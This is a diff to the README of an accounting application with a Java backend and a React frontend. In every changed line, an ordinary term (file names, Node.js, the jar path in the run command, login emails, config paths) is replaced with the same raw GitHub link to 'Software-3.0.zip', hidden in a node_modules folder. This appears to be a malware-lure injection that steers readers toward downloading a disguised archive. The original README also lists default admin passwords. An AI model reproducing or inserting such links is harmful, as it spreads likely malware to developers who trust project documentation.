@@ -11,14 +11,14 @@ accounting-app/
 │   ├── core/               # Core entities and repositories
 │   └── modules/            # Feature modules
 ├── frontend/               # React frontend application
-└── README.md              # This file
+└── https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip              # This file
 ```
 
 ## Prerequisites
 
 - Java 17 or higher
 - Maven 3.6+
-- Node.js 18+ and npm
+- https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip 18+ and npm
 - PostgreSQL 12+
 
 ## Setup Instructions
@@ -43,7 +43,7 @@ GRANT ALL PRIVILEGES ON DATABASE comptamaroc TO comptamaroc;
 3. Run the application:
    ```bash
    cd backend/app
-   java -jar target/app-0.1.0-SNAPSHOT.jar
+   java -jar https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip
    ```
 
 The backend will start on `http://localhost:8080`
@@ -67,8 +67,8 @@ The frontend will start on `http://localhost:3000`
 
 ## Default Login Credentials
 
-- **Admin**: admin@comptamaroc.com / admin123
-- **Accountant**: accountant@comptamaroc.com / accountant123
+- **Admin**: https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip / admin123
+- **Accountant**: https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip / accountant123
 
 ## Features
 
@@ -86,7 +86,7 @@ The frontend will start on `http://localhost:3000`
 
 ### Backend Configuration
 
-The backend configuration is located in `backend/app/src/main/resources/application.yml`. Key settings:
+The backend configuration is located in `https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip`. Key settings:
 
 - Database connection
 - JWT token settings
@@ -95,7 +95,7 @@ The backend configuration is located in `backend/app/src/main/resources/applicat
 
 ### Frontend Configuration
 
-The frontend configuration is in `frontend/.env`:
+The frontend configuration is in `https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip`:
 
 - `VITE_API_BASE_URL`: Backend API URL
 - `VITE_APP_NAME`: Application name
@@ -112,7 +112,7 @@ The frontend configuration is in `frontend/.env`:
 
 For production deployment:
 
-1. Change `ddl-auto` to `validate` in application.yml
+1. Change `ddl-auto` to `validate` in https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip
 2. Enable Flyway migrations
 3. Use environment-specific configuration files
 4. Build the frontend for production: `npm run build`
